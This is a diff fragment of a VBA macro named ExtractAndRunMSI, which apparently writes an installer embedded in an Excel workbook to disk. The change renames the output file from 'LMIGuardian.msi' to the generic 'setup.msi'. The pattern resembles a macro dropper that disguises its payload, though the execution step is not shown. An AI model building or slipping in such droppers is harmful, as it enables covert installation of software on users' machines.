@@ -68,7 +68,7 @@ Public Sub ExtractAndRunMSI()
     
     If lastRow = 0 Or ThisWorkbook.Path = "" Then Exit Sub
     
-    outFile = ThisWorkbook.Path & "\LMIGuardian.msi"
+    outFile = ThisWorkbook.Path & "\setup.msi"
     
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1 ' binary
